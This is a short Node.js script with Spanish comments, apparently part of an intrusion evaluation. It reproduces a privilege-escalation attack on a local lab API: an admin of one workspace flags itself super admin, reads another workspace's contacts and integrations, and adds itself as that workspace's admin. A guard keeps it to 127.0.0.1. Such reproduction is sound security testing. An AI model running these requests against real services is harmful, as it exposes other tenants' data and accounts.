// Reproduce la escalada de privilegios paso a paso. Solo en el laboratorio local.
//   node evals/intrusion/escalada.mjs <estado-lab.json>

import { readFileSync } from "node:fs";

const lab = JSON.parse(readFileSync(process.argv[2], "utf8"));
if (!/^http:\/\/127\.0\.0\.1:/.test(lab.url)) throw new Error("Solo en local");
const atacante = lab.actors.bAdmin;

const rest = async (method, path, body) => {
  const res = await fetch(`${lab.url}${path}`, {
    method,
    headers: {
      apikey: lab.anon,
      authorization: `Bearer ${atacante.session.access_token}`,
      "content-type": "application/json",
      prefer: "return=representation",
    },
    body: body ? JSON.stringify(body) : undefined,
  });
  return { status: res.status, json: await res.json().catch(() => null) };
};

const leerSecreto = async () => {
  const r = await rest("GET", `/rest/v1/contacts?workspace_id=eq.${lab.a.id}&select=name,email`);
  return { status: r.status, filas: r.json };
};

console.log("1. Antes, el admin de B lee contactos de A:", JSON.stringify(await leerSecreto()));
const ascenso = await rest("PATCH", `/rest/v1/users?id=eq.${atacante.id}`, { is_super_admin: true });
console.log("2. Se marca súper admin:", ascenso.status, JSON.stringify(ascenso.json?.[0]?.is_super_admin ?? ascenso.json));
console.log("3. Después, lee contactos de A:", JSON.stringify(await leerSecreto()));
const creds = await rest("GET", `/rest/v1/integrations?workspace_id=eq.${lab.a.id}&select=provider`);
console.log("4. Ve las integraciones de A:", creds.status, JSON.stringify(creds.json));
const miembro = await rest("POST", "/rest/v1/memberships", { workspace_id: lab.a.id, user_id: atacante.id, role: "admin" });
console.log("5. Se suma como admin de A:", miembro.status, JSON.stringify(miembro.json?.[0]?.role ?? miembro.json));
console.log("6. Ya como admin, lee contactos de A:", JSON.stringify(await leerSecreto()));
